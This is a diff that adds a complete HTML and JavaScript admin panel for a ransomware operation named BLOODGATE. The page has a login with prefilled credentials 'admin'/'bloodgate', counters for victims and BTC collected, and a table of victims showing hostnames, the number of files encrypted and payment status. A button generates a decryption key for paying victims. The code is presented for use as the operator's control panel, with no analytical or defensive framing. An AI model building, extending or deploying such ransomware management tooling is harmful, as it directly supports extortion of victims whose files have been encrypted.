@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>🩸 BLOODGATE Dashboard</title>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            font-family: 'Courier New', monospace;
+            background: #0a0a0a;
+            color: #cc0000;
+            padding: 20px;
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px;
+            border-bottom: 2px solid #cc0000;
+            margin-bottom: 30px;
+        }
+        .logo {
+            font-size: 28px;
+            color: #ff0000;
+            text-shadow: 0 0 20px rgba(255,0,0,0.3);
+        }
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        .stat-card {
+            background: rgba(255,0,0,0.05);
+            border: 1px solid rgba(255,0,0,0.2);
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+        }
+        .stat-card .number {
+            font-size: 36px;
+            font-weight: bold;
+            color: #ff0000;
+        }
+        .stat-card .label {
+            color: #884444;
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            background: rgba(255,0,0,0.02);
+        }
+        th, td {
+            padding: 12px;
+            text-align: left;
+            border-bottom: 1px solid rgba(255,0,0,0.1);
+        }
+        th {
+            color: #884444;
+            text-transform: uppercase;
+            font-size: 11px;
+            letter-spacing: 1px;
+        }
+        td { color: #cc8888; }
+        .status-paid { color: #33ff33; }
+        .status-pending { color: #ff4444; }
+        .status-decrypted { color: #33ccff; }
+        .btn {
+            background: rgba(255,0,0,0.2);
+            border: 1px solid #ff0000;
+            color: #ff4444;
+            padding: 5px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-family: 'Courier New', monospace;
+        }
+        .btn:hover {
+            background: rgba(255,0,0,0.3);
+        }
+        .login-form {
+            max-width: 400px;
+            margin: 100px auto;
+            padding: 40px;
+            background: rgba(255,0,0,0.02);
+            border: 2px solid #cc0000;
+            border-radius: 10px;
+            text-align: center;
+        }
+        .login-form input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            background: rgba(0,0,0,0.5);
+            border: 1px solid #333;
+            color: #cc0000;
+            border-radius: 5px;
+            font-family: 'Courier New', monospace;
+        }
+        .login-form button {
+            width: 100%;
+            padding: 12px;
+            background: #cc0000;
+            border: none;
+            color: white;
+            font-weight: bold;
+            border-radius: 5px;
+            cursor: pointer;
+            font-family: 'Courier New', monospace;
+            font-size: 16px;
+        }
+        .login-form button:hover {
+            background: #ff0000;
+        }
+        .login-form .error {
+            color: #ff0000;
+            margin: 10px 0;
+        }
+        .hidden { display: none; }
+        .generate-key-btn {
+            background: #00aa00;
+            border: 1px solid #00ff00;
+            color: #00ff00;
+            padding: 3px 10px;
+            border-radius: 3px;
+            cursor: pointer;
+            font-size: 11px;
+        }
+        .generate-key-btn:hover { background: rgba(0,255,0,0.2); }
+    </style>
+</head>
+<body>
+
+<div id="loginForm" class="login-form">
+    <div style="font-size:48px; margin-bottom:20px;">🩸</div>
+    <h2 style="color:#ff0000;">BLOODGATE</h2>
+    <p style="color:#884444; margin-bottom:20px;">Admin Access</p>
+    <input type="text" id="username" placeholder="Username" value="admin">
+    <input type="password" id="password" placeholder="Password" value="bloodgate">
+    <button onclick="login()">🔓 Enter</button>
+    <div id="loginError" class="error hidden"></div>
+</div>
+
+<div id="dashboardContent" class="hidden">
+    <div class="header">
+        <div class="logo">🩸 BLOODGATE</div>
+        <div style="color:#884444;">
+            <span id="timestamp"></span>
+            <button onclick="logout()" style="margin-left:20px; background:rgba(255,0,0,0.2); border:1px solid #ff0000; color:#ff4444; padding:5px 15px; border-radius:5px; cursor:pointer; font-family:'Courier New',monospace;">Logout</button>
+        </div>
+    </div>
+
+    <div class="stats" id="stats">
+        <div class="stat-card">
+            <div class="number" id="totalVictims">0</div>
+            <div class="label">Total Victims</div>
+        </div>
+        <div class="stat-card">
+            <div class="number" id="paidVictims">0</div>
+            <div class="label">Paid</div>
+        </div>
+        <div class="stat-card">
+            <div class="number" id="activeVictims">0</div>
+            <div class="label">Active (Unpaid)</div>
+        </div>
+        <div class="stat-card">
+            <div class="number" id="totalBTC">0</div>
+            <div class="label">Total BTC Collected</div>
+        </div>
+    </div>
+
+    <h3 style="color:#884444; margin:20px 0 10px;">📋 Victim List</h3>
+    <div style="overflow-x:auto;">
+        <table>
+            <thead>
+                <tr>
+                    <th>ID</th>
+                    <th>Hostname</th>
+                    <th>Files</th>
+                    <th>Status</th>
+                    <th>Registered</th>
+                    <th>Action</th>
+                </tr>
+            </thead>
+            <tbody id="victimTable">
+            </tbody>
+        </table>
+    </div>
+</div>
+
+<script>
+    let token = '';
+
+    // ===== LOGIN =====
+    async function login() {
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+        const errorDiv = document.getElementById('loginError');
+        
+        errorDiv.classList.add('hidden');
+        
+        try {
+            const response = await fetch('/api/admin/login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username, password })
+            });
+            
+            const data = await response.json();
+            
+            if (data.success) {
+                token = data.token;
+                document.getElementById('loginForm').classList.add('hidden');
+                document.getElementById('dashboardContent').classList.remove('hidden');
+                loadDashboard();
+                setInterval(loadDashboard, 10000);
+            } else {
+                errorDiv.textContent = '❌ Invalid credentials';
+                errorDiv.classList.remove('hidden');
+            }
+        } catch (error) {
+            errorDiv.textContent = '❌ Connection error';
+            errorDiv.classList.remove('hidden');
+        }
+    }
+
+    // ===== LOGOUT =====
+    function logout() {
+        token = '';
+        document.getElementById('loginForm').classList.remove('hidden');
+        document.getElementById('dashboardContent').classList.add('hidden');
+    }
+
+    // ===== LOAD DASHBOARD =====
+    async function loadDashboard() {
+        try {
+            const response = await fetch('/api/admin/dashboard', {
+                headers: { 'Authorization': 'Bearer ' + token }
+            });
+            
+            if (response.status === 401) {
+                logout();
+                return;
+            }
+            
+            const data = await response.json();
+            
+            document.getElementById('totalVictims').textContent = data.totalVictims;
+            document.getElementById('paidVictims').textContent = data.paidVictims;
+            document.getElementById('activeVictims').textContent = data.activeVictims;
+            document.getElementById('totalBTC').textContent = data.totalBTC + ' BTC';
+            document.getElementById('timestamp').textContent = new Date().toLocaleString();
+            
+            // Load victims
+            loadVictims();
+        } catch (error) {
+            console.error('Dashboard error:', error);
+        }
+    }
+
+    // ===== LOAD VICTIMS =====
+    async function loadVictims() {
+        try {
+            const response = await fetch('/api/admin/victims', {
+                headers: { 'Authorization': 'Bearer ' + token }
+            });
+            
+            if (response.status === 401) {
+                logout();
+                return;
+            }
+            
+            const victims = await response.json();
+            const table = document.getElementById('victimTable');
+            table.innerHTML = '';
+            
+            victims.slice().reverse().forEach(v => {
+                const row = document.createElement('tr');
+                
+                let statusText = '💀 Pending';
+                let statusClass = 'status-pending';
+                if (v.paid && v.decrypted) {
+                    statusText = '✅ Decrypted';
+                    statusClass = 'status-decrypted';
+                } else if (v.paid) {
+                    statusText = '💰 Paid';
+                    statusClass = 'status-paid';
+                }
+                
+                const hostname = v.systemInfo?.hostname || v.systemInfo?.username || 'Unknown';
+                
+                row.innerHTML = `
+                    <td style="color:#ff6666;">${v.id}</td>
+                    <td>${hostname}</td>
+                    <td>${v.filesEncrypted || 0}</td>
+                    <td class="${statusClass}">${statusText}</td>
+                    <td style="color:#666;">${new Date(v.registeredAt).toLocaleDateString()}</td>
+                    <td>
+                        ${v.paid && !v.decrypted ? 
+                            `<button class="generate-key-btn" onclick="generateKey('${v.id}')">🔑 Generate Key</button>` : 
+                            v.decrypted ? '✅' : '⏳'
+                        }
+                    </td>
+                `;
+                table.appendChild(row);
+            });
+        } catch (error) {
+            console.error('Load victims error:', error);
+        }
+    }
+
+    // ===== GENERATE DECRYPTION KEY =====
+    async function generateKey(victimId) {
+        if (!confirm(`Generate decryption key for victim ${victimId}?`)) return;
+        
+        try {
+            const response = await fetch('/api/admin/generate-key', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Authorization': 'Bearer ' + token
+                },
+                body: JSON.stringify({ victimId })
+            });
+            
+            const data = await response.json();
+            
+            if (data.success) {
+                alert(`🔑 Decryption Key: ${data.decryptionKey}\n\nShare this with the victim.`);
+                loadVictims();
+            } else {
+                alert('❌ ' + (data.error || 'Failed to generate key'));
+            }
+        } catch (error) {
+            alert('❌ Error: ' + error.message);
+        }
+    }
+
+    // ===== ENTER KEY ON LOGIN =====
+    document.addEventListener('keydown', (e) => {
+        if (e.key === 'Enter') login();
+    });
+
+    // ===== CHECK LOGIN ON LOAD =====
+    document.addEventListener('DOMContentLoaded', () => {
+        // Check if already logged in
+        const savedToken = localStorage.getItem('bloodgate_token');
+        if (savedToken) {
+            token = savedToken;
+            document.getElementById('loginForm').classList.add('hidden');
+            document.getElementById('dashboardContent').classList.remove('hidden');
+            loadDashboard();
+            setInterval(loadDashboard, 10000);
+        }
+    });
+
+    // Save token
+    function saveToken(t) {
+        token = t;
+        localStorage.setItem('bloodgate_token', t);
+    }
+</script>
+
+</body>
+</html>
